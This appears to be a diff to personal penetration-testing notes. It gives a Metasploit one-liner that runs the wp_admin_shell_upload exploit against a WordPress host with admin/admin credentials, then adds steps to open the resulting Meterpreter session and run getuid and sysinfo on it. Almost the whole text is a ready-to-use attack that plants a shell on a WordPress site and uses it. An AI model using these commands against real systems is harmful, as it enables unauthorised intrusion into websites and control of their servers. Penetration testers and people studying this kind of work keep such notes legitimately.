@@ -15,3 +15,8 @@ run -j
 
 one-liner
 msfconsole -qx ' use exploit/unix/webapp/wp_admin_shell_upload; set rhosts 10.1.1.80; set vhost myserver.domain.local; set username admin; set password admin; set HTTPClientTimeout 300; run -j'
+meterpreter will tell you the sesssion connected with and then need to open it
+sessions -i 1
+sessions; will show you sessions. Above opens one interactively
+meterpreter>getuid
+meterpreter>sysinfo
